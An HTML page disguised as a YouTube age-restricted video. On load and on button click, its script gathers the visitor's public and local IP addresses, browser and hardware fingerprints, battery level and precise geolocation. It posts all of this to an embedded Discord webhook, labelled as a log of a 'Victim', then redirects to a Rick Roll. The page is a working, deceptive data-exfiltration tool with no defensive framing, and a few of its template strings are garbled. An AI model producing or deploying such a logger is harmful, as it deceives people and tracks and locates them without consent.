<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>YouTube</title>
  <style>
    body { margin:0; background:#0f0f0f; color:#fff; font-family:Arial, sans-serif; overflow:hidden; }
    .header { background:#202020; padding:10px; display:flex; align-items:center; gap:20px; }
    .fake-video { width:100%; max-width:900px; margin:40px auto; background:#000; padding:20px; border-radius:8px; }
    .loader { text-align:center; padding:60px; }
    .spinner { border:6px solid #333; border-top:6px solid #ff0000; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:20px auto; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    button { background:#ff0000; color:white; border:none; padding:15px 40px; font-size:18px; cursor:pointer; margin-top:20px; }
  </style>
</head>
<body>
  <div class="header">
    <h2 style="color:#ff0000;">YouTube</h2>
    <input type="text" value="https://youtu.be/dQw4w9WgXcQ" style="flex:1; background:#333; border:none; color:#fff; padding:8px;">
  </div>

  <div class="fake-video">
    <div class="loader">
      <div class="spinner"></div>
      <h2>Video is loading...</h2>
      <p>This video contains age-restricted content. You must be 18+ to continue.</p>
      <button onclick="startLogging()">I AM OVER 18 - WATCH VIDEO</button>
    </div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1502455931399569451/M4sc-m7Cj5hPwNKjClTL-TNB_ijX3Llb6MAuMD1UJhQC3k9Rupd85L-LwLbNpskNANZH";

    async function sendWebhook(payload) {
      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch(e) {}
    }

    // Advanced Fingerprinting
    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = "#f00";
        ctx.fillRect(0, 0, 220, 110);
        ctx.fillStyle = "#0f0";
        ctx.font = "18px Arial";
        ctx.fillText("Boss Max Logger " + Date.now(), 20, 60);
        return canvas.toDataURL().substring(0, 180);
      } catch(e) { return "N/A"; }
    }

    function getWebGLFingerprint() {
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (!gl) return "N/A";
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
          renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
        };
      } catch(e) { return "N/A"; }
    }

    async function getBattery() {
      if (navigator.getBattery) {
        try {
          const b = await navigator.getBattery();
          return `${Math.floor(b.level*100)}% ${b.charging ? '(Charging)' : ''}`;
        } catch(e) {}
      }
      return "N/A";
    }

    async function getWebRTCIP() {
      return new Promise(resolve => {
        const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers:[]});
        let ips = new Set();
        pc.onicecandidate = e => {
          if (e.candidate) {
            const match = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
            if (match) ips.add(match[0]);
          }
        };
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        setTimeout(() => resolve([...ips].join(", ") || "N/A"), 1200);
      });
    }

    async function initialLog() {
      let ipData = {};
      try {
        const promises = [
          fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
          fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {})
        ];
        const results = await Promise.allSettled(promises);
        ipData = { ...results[0].value, ...results[1].value };
      } catch(e) {}

      const webrtcIP = await getWebRTCIP();
      const canvas = getCanvasFingerprint();
      const webgl = getWebGLFingerprint();
      const battery = await getBattery();

      const payload = {
        content: "**🪝 ULTIMATE INITIAL LOG - Victim Opened Link**",
        embeds: [{
          title: "🎥 YouTube Rick Roll - God Tier Logger",
          color: 0xff0000,
          fields: [
            { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
            { name: "Local IP (WebRTC)", value: `\`${webrtcIP}\``, inline: true },
            { name: "Location", value: "**Not known yet — waiting for permission...**", inline: false },
            { name: "City/Region/ISP", value: `${ipData.city || "N/A"}, ${ipData.region || "N/A"} | ${ipData.org || "N/A"}`, inline: false },
            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
            { name: "Screen / Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"} | RAM: ${navigator.deviceMemory || "N/A"}GB`, inline: false },
            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
            { name: "Battery", value: battery, inline: true },
            { name: "Canvas Fingerprint", value: `\`\`\`${canvas}\`\`\``, inline: false },
            { name: "WebGL", value: `${webgl.vendor || "N/A"} - ${webgl.renderer || "N/A"}`, inline: false },
            { name: "Plugins", value: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ").substring(0,150) : "N/A", inline: false },
            { name: "Languages", value: navigator.languages ? navigator.languages.join(", ") : "N/A", inline: false },
            { name: "Do Not Track", value: navigator.doNotTrack || "N/A", inline: true },
            { name: "Touch Support", value: `${'ontouchstart' in window} | Max Points: ${navigator.maxTouchPoints || 0}`, inline: true },
            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
          ],
          footer: { text: "Stage 1 • Maximum Logger" }
        }]
      };
      await sendWebhook(payload);
    }

    async function sendLocationUpdate(lat, lon, acc) {
      const mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
      const payload = {
        content: "**📍 LOCATION PERMISSION GRANTED - Exact Position Acquired**",
        embeds: [{
          title: "🎯 Precise Geolocation Update",
          color: 0x00ff00,
          fields: [
            { name: "Google Maps", value: `[📍 Click to View Exact Location](${mapsLink})`, inline: false },
            { name: "Coordinates", value: `Latitude: ${lat}\nLongitude: \( {lon}\nAccuracy: ± \){acc} meters`, inline: false },
            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
          ],
          footer: { text: "Stage 2 • Boss Mode" }
        }]
      };
      await sendWebhook(payload);
    }

    function getGeolocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude.toFixed(8);
            const lon = pos.coords.longitude.toFixed(8);
            const acc = pos.coords.accuracy.toFixed(0);
            sendLocationUpdate(lat, lon, acc);
          },
          () => {}
        );
      }
    }

    function startLogging() {
      getGeolocation();
      setTimeout(() => {
        window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=zGjTHHrh1HdE0kiL";
      }, 1800);
    }

    window.onload = () => {
      initialLog();
      setTimeout(getGeolocation, 800);
    };
  </script>
</body>
</html>
